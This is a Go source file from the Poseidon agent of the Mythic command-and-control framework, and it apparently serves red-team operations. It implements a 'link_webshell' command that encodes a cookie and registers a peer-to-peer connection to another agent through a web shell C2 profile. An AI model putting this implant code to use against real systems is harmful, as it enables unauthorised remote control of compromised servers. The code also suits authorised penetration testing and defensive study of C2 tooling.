package link_webshell

import (
	// Standard

	"encoding/base64"
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	CookieValue string `json:"cookie_value"`
	CookieName  string `json:"cookie_name"`
	URL         string `json:"url"`
	UserAgent   string `json:"user_agent"`
	QueryParam  string `json:"query_param"`
	TargetUUID  string `json:"target_uuid"`
}

// Run - package function to run link_tcp
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	args.CookieValue = base64.StdEncoding.EncodeToString([]byte(args.CookieValue))
	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
		C2ProfileName: "webshell",
		Connection:    args,
	}
	responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
		Source:        profiles.GetMythicID(),
		Destination:   args.TargetUUID,
		Action:        "add",
		C2ProfileName: "webshell",
	}
	msg.UserOutput = "Successfully Connected"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return
}
